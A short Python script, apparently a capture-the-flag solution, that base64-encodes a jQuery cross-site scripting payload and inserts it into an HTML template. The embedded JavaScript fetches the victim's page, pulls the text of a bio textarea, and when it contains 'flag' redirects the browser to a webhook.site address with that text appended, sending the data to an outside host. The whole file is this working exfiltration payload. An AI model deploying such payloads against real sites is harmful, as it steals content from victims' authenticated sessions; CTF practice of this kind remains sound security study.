import base64

payload = b"""
$(document).ready(function() {
  $.get('/', (data) => {
    let rx = /<textarea class.+>(.*)<\/textarea>/g;
    let arr = rx.exec(data);
    let bio = arr[1];
    if (bio.indexOf("flag") !== -1) {
      location.href = "http://webhook.site/a18dafbc-8a62-49f8-95dc-9eec735f9a8e/?x=" + btoa(bio);
    } else {
      alert("Report me");
    }
  });
});
"""

with open("template.html", "r") as f:
    html = f.read().replace("#####", base64.b64encode(payload).decode())

print(html)